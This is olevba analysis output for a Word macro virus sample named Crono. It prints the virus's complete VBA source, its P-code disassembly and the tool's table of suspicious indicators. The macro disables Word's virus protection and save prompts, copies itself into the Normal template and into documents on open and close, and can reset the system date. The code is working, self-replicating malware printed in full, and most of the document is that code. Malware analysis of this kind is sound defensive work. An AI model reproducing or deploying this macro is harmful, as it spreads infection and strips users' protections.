olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Crono.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Crono.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()



Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
LDA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
LPG = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Not ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("VFxD%:&-/", 1, 1, 1000, 1000, True) Then
If LDA > 0 Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LDA
INDA = True
End If
If Not NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Find("VFxD%:&-/", 1, 1, 1000, 1000, True) Then
If LPG > 0 Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, LPG
INPG = True
ActiveDocument.Saved = True
End If
If INPG <> True And INDA <> True Then GoTo IRA
' & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If INPG = True Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LDA))
If INDA = True Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, LPG))
IRA:
If LPG <> 0 And LDA = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True
End If
ff = Format(Date, "ddmyyyy")
d = Day(Now)
m = Month(Now)
y = Year(Now)
f2 = d & m & y
If ff > f2 Then
    Randomize
    Select Case Int(15 * Rnd) + 1
    Case Is = 1: MsgBox ("Message by Crono:" & vbCrLf & "I don't like this document")
    Case Is = 2: MsgBox ("Message by Crono:" & vbCrLf & "This document is a shit")
    Case Is = 3: MsgBox ("Message by Crono:" & vbCrLf & "You are in my domain")
    Case Is = 4: MsgBox ("Message by Crono:" & vbCrLf & "Close the application, today I'm very hungry!")
    Case Is = 5: MsgBox ("Message by Crono:" & vbCrLf & "Be carefull, I'm still stay here")
    Case Is = 6: MsgBox ("Message by Crono:" & vbCrLf & "Oh! Oh! Microsoft fall")
    Case Is = 7: MsgBox ("Message by Crono:" & vbCrLf & "Kernel32.dll was infected")
    Case Is = 8: MsgBox ("Message by Crono:" & vbCrLf & "The grammar have been disabled")
    Case Is = 9: MsgBox ("Message by Crono:" & vbCrLf & "You can't do nothing but Crono can")
    Case Is = 10: MsgBox ("Message by Crono:" & vbCrLf & "Talk about me and you will be free")
    Case Is = 11: MsgBox ("Message by Crono:" & vbCrLf & "I can feel your fear!")
    Case Is = 12: MsgBox ("Message by Crono:" & vbCrLf & "I'm sending your data to all world")
    Case Is = 13: MsgBox ("Message by Crono:" & vbCrLf & "Smile with me! :-)  ;-(  :-O")
    Case Is = 14: MsgBox ("Message by Crono:" & vbCrLf & "Inspired in MelissaWordMacroVirus")
    Case Is = 15: MsgBox ("Message by Crono:" & vbCrLf & "I change your Date to 01/01/1875"): Date = "01/01/1875"
    End Select
End If
End Sub



















































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Crono.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10853 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LDA 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St LPG 
' Line #7:
' 	LitStr 0x0009 "VFxD%:&-/"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0006 
' 	Not 
' 	IfBlock 
' Line #8:
' 	Ld LDA 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LDA 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #9:
' 	LitVarSpecial (True)
' 	St INDA 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitStr 0x0009 "VFxD%:&-/"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0006 
' 	Not 
' 	IfBlock 
' Line #12:
' 	Ld LPG 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld LPG 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #13:
' 	LitVarSpecial (True)
' 	St INPG 
' Line #14:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld INPG 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld INDA 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo IRA 
' 	EndIf 
' Line #17:
' 	QuoteRem 0x0000 0x006C " & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")"
' Line #18:
' 	Ld INPG 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld LDA 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	Ld INDA 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld LPG 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #20:
' 	Label IRA 
' Line #21:
' 	Ld LPG 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld LDA 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #22:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #24:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Ld Date 
' 	LitStr 0x0007 "ddmyyyy"
' 	ArgsLd Format$ 0x0002 
' 	St ff 
' Line #27:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	St d 
' Line #28:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	St m 
' Line #29:
' 	Ld Now 
' 	ArgsLd Year 0x0001 
' 	St y 
' Line #30:
' 	Ld d 
' 	Ld m 
' 	Concat 
' 	Ld y 
' 	Concat 
' 	St f2 
' Line #31:
' 	Ld ff 
' 	Ld f2 
' 	Gt 
' 	IfBlock 
' Line #32:
' 	ArgsCall Read 0x0000 
' Line #33:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	SelectCase 
' Line #34:
' 	LitDI2 0x0001 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x001A "I don't like this document"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #35:
' 	LitDI2 0x0002 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0017 "This document is a shit"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #36:
' 	LitDI2 0x0003 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0014 "You are in my domain"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #37:
' 	LitDI2 0x0004 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x002D "Close the application, today I'm very hungry!"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #38:
' 	LitDI2 0x0005 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0020 "Be carefull, I'm still stay here"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #39:
' 	LitDI2 0x0006 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0016 "Oh! Oh! Microsoft fall"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #40:
' 	LitDI2 0x0007 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0019 "Kernel32.dll was infected"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #41:
' 	LitDI2 0x0008 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x001E "The grammar have been disabled"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #42:
' 	LitDI2 0x0009 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0022 "You can't do nothing but Crono can"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #43:
' 	LitDI2 0x000A 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0022 "Talk about me and you will be free"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #44:
' 	LitDI2 0x000B 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0015 "I can feel your fear!"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #45:
' 	LitDI2 0x000C 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0022 "I'm sending your data to all world"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #46:
' 	LitDI2 0x000D 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x001C "Smile with me! :-)  ;-(  :-O"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #47:
' 	LitDI2 0x000E 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0021 "Inspired in MelissaWordMacroVirus"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #48:
' 	LitDI2 0x000F 
' 	CaseEq 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "Message by Crono:"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0020 "I change your Date to 01/01/1875"
' 	Concat 
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x000A "01/01/1875"
' 	St Date 
' Line #49:
' 	EndSelect 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Kernel32.dll        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

